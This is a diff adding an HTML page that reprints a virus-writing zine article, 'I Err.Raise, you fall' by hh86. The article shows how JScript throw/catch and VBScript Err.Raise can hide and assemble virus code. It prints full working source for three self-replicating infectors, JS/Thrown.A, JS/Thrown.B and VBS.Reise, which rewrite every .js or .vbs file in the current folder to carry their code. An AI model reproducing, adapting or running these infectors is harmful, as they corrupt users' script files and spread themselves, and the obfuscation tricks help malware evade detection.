@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en-US">
+	<head>
+		<title>Valhalla #1: I Err.Raise, you fall by hh86</title>
+		<meta charset="utf-8">
+		<meta name="Keywords" content="">
+		<meta name="Description" content="">
+		<link type="text/css" rel="stylesheet" href="valhalla-articles.css">
+	</head>
+	<body>
+	
+		<h1 style="text-align:center; font-family: Verdana; font-size: 24px; color: rgb(213, 21, 199);text-shadow: 2px 2px 5px rgb(158, 34, 198);">VALHALLA Issue #1</h1>
+	<h1 style="text-align:center; font-family: Verdana; font-size: 12px; color: #ffffff"><i>2019 Re-edition</i></h1>	
+	<div class="main-container-articles">
+	<pre>
+                              I Err.Raise, you fall
+                                       by               
+                                      hh86
+
+Exceptions
+
+Try and Catch are the most widely used statements for exception handlers in most
+languages. When we run code that might be vulnerable to unexpected exceptions we
+can run it in Try block.   If an exception occurs, then the  Catch block handles
+the problem.  This mechanism also includes a statement to cause an exception. It
+is  the  Throw  statement.  The Throw  statement  can  specify an exception info
+to be supplied to the  Catch (it should decide then on handling it or not).
+
+
+Throw it
+
+My idea  for an engine is to create a decryptor to build the virus body piece by
+piece using Try, Catch and Throw.   In Try block we raise an exception, in Catch
+we rebuild, it would be like this:
+
+        a=&#x22;&#x22;
+        try
+        {
+            throw &#x22;f = new Activ&#x22;
+        }
+        catch(e) {a += e}
+        try
+        {
+            throw &#x22;eXObject(&#x22;
+        }
+        catch(y) {a += y}
+
+       //now run the code
+
+I have created an engine, it is so simple, but the result is very good.
+Here is JS/Thrown.A:
+
+//hh86
+h()
+function h()
+{
+    //JS/Thrown.A
+    f=new ActiveXObject(&#x22;Scripting.FileSystemObject&#x22;)
+    q = rn()
+    k = q+&#x22;=[];&#x22;
+    l = &#x22;&#x22; + h
+    for(i=0;i&#x3C;l.length;i++)
+    {
+         c = l.substr(i,1).charCodeAt(0).toString(16)
+         if(c==&#x22;a&#x22; || c==&#x22;d&#x22;){c =&#x22;0&#x22;+c}
+         y = rn()
+         k = k + &#x22;try{throw\&#x22;\\x&#x22; + c + &#x22;\&#x22;}catch(&#x22; + y + &#x22;)&#x22; + &#x22;{&#x22; + q + &#x22;.push(&#x22; + y + &#x22;)};&#x22;
+    }
+
+    k = k + &#x22;;&#x22; + q + &#x22;=&#x22; + q + &#x22;.join(\&#x22;\&#x22;);eval(\&#x22;h();\&#x22;+&#x22; + q + &#x22;);&#x22;
+    for(y=new Enumerator(f.getfolder(&#x22;.&#x22;).files);!y.atEnd();y.moveNext())
+    {
+        x=y.item();
+        if(f.GetExtensionName(x).toLowerCase()==&#x22;js&#x22;)
+        {
+            try
+            {
+                b=f.OpenTextFile(x);h=b.ReadAll();b.Close();
+                if(h.substr(0,6)!=&#x22;//hh86&#x22;)
+                {
+                    p=x.Attributes;x.Attributes=0;l=f.CreateTextFile(x);l.Write(k+h);l.Close();x.Attributes=p
+                }
+            }
+            catch(e)
+            {}
+        }
+    }
+    function rn()
+    {
+        return &#x22;r&#x22;+f.GetTempName().substr(3,5)
+    }
+}
+
+
+EPO
+
+We will use the function constructor like this: 
+
+        try
+        {
+            throw function(){WScript.Echo(&#x22;Oh! Hello :)&#x22;)}
+        }
+        catch(e) {e()}
+
+
+Awesome!
+An  obvious  extension  to that code is not calling the virus body whithin Catch
+block, sample 1.  However, Catch is executed when function returns.  So, what if
+we want to decrypt something in function and build in Catch? Then we use return,
+sample 2.  Yet we have another trick, we do not clearly specify we have function
+to be executed (without &#x22;()&#x22;), in this case we need to run in Catch, sample 3.
+
+Sample 1:
+        try 
+        {
+            throw g()
+        }
+        catch(e) {}
+        function g() {...}
+
+
+Sample 2:
+
+        a=&#x22;&#x22;
+        try 
+        {
+            throw g()
+        }
+        catch(e) {a += e}
+        ...
+        function g() {return &#x22;f = new Activ&#x22;}
+
+
+Sample 3:
+        try
+        {
+            throw g
+        }
+        catch(e) {e()}
+        function g() {...}
+
+And then we can use sample 2, but returning a function:
+
+        try
+        {
+            throw g();
+        }
+        catch(e){e()}
+        function g()
+        {
+            return function(){WScript.Echo(&#x22;Oh, Hello again and again!&#x22;)}
+        } 
+
+Throw  can  be used in so many ways in such a functional language as is JScript.
+Here is JS/Thrown.B:
+
+//hh86
+try{throw function t()
+{
+    /*JS/Thrown by hh86*/
+    f=new ActiveXObject(&#x22;Scripting.FileSystemObject&#x22;);
+    for(y=new Enumerator(f.getfolder(&#x22;.&#x22;).files);!y.atEnd();y.moveNext())
+    {
+        x=y.item();
+        if(f.GetExtensionName(x).toLowerCase()==&#x22;js&#x22;)
+        {
+            try
+            {
+                b=f.OpenTextFile(x);h=b.ReadAll();b.Close();
+                if(h.substr(0,6)!=&#x22;//hh86&#x22;)
+                {
+                    p=x.Attributes;x.Attributes=0;l=f.CreateTextFile(x);l.Write(&#x22;//hh86\rtry{throw &#x22;+t+&#x22;}catch(e){e()}&#x22;+&#x22;\r&#x22;+h);l.Close();x.Attributes=p
+                }
+            }
+            catch(e)
+            {}
+        }
+    }
+}
+}
+catch(e){e()}
+
+
+VBScript
+
+VBScript has no Try, Catch and Throw statement. Instead we have &#x27;On Error Resume
+Next&#x27; and &#x27;On Error GoTo 0&#x27;.   The  first  one is so obvious, the latter goes by
+default, no exception handling is used.   Method Raise from Err object can cause
+an exception on purpose.  It has some arguments: Number (long), Source (string),
+Description (string), HelpFile (string), HelpContext (string).  Since the latter
+On Error does not support GoTo Label, we cannot specify a routine to handle err.
+On Resume Next, when an exception  happens the IP is moved to next and continues
+execution, unpredictableness  happens  next.  If we adjust the JScript idea then
+we can do the next:
+
+
+    on error resume next                &#x27;must specify
+    err.raise asc(&#x22;s&#x22;)                  &#x27;cause exception, send char code
+    v = v &#x26; chr(err)                    &#x27;get and concatenate
+    err.raise asc(&#x22;e&#x22;)
+    v = v &#x26; chr(err)
+    err.raise asc(&#x22;t&#x22;)
+    v = v &#x26; chr(err)
+
+
+We send every  character code of the source as exception number.  We concatenate
+the character and so it continues.  I do not use &#x27;Err.Number&#x27; because Err itself
+returns  the  exception number, for optimisation sake.  You can send code in any
+form you want, as string, or number, etcetera.
+
+
+EPO
+
+Good news is, I finally found how to use it to call a routine. So simple.
+Instead of Number or description or help of any kind, we will pass the name of a
+function (not a Sub, not a Label.  Function). The function will be automatically
+executed before the IP is moved to next line.  So, we hook  the execution there.
+VB6 behaves the same with this.  Here goes the code, very simple.
+
+    on error resume next
+    err.raise v                         &#x27;au revoir ()
+    ...                                 &#x27;host code
+
+    function v()
+    ...                                 &#x27;virus code
+    end function
+
+Great, isn&#x27;t it? ;)
+
+Here is VBS.Reise:
+
+:on error resume next
+&#x27;VBS.reise by halloweeney
+set f=createobject(&#x22;scripting.filesystemobject&#x22;)
+u=left(f.gettempname,8)
+v=&#x22;function &#x22;+u+&#x22;()&#x22;+&#x22;:&#x22;+f.opentextfile(wscript.scriptfullname).readall+&#x22;:end function&#x22;
+set o=f.getfolder(&#x22;.&#x22;)
+for each x in o.files
+    if lcase(f.getextensionname(x))=&#x22;vbs&#x22;then
+        a=x.attributes
+        x.attributes=0
+        g=f.opentextfile(x).readall
+        if err=0then
+            if left(g,1)&#x3C;&#x3E;&#x22;:&#x22;then
+                set s=f.createtextfile(x)
+                s.write(&#x22;:on error resume next:err.raise &#x22;+u+vbcrlf+g+vbcrlf+v)
+                s.close
+            end if
+        end if
+        x.attributes=a
+    end if
+next
+	</pre>
+	</div>
+	</body>
+</html>
